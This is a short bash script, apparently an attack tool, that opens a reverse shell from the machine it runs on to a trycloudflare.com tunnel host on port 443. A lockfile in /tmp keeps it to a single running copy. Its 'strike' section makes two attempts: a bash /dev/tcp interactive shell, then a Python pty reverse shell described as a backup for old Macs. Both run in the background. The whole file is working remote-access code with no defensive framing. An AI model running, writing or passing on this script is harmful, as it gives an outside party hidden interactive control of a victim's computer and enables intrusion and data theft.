#!/bin/bash
# TARGET: https://gain-properly-curriculum-project.trycloudflare.com
HOST="gain-properly-curriculum-project.trycloudflare.com"
PORT="443"

# --- FAILSAFE ---
LOCKFILE="/tmp/jules_bridge.lock"
if [ -f "$LOCKFILE" ]; then
    PID=$(cat "$LOCKFILE")
    if ps -p "$PID" > /dev/null; then exit 0; fi
fi
echo $$ > "$LOCKFILE"

# --- THE STRIKE ---
# Method 1: Bash Native Socket (Fastest)
/bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1 &

# Method 2: Python PTY (Most Stable for old Macs)
# This backup runs if Method 1 fails or drops.
sleep 5
python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$HOST',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
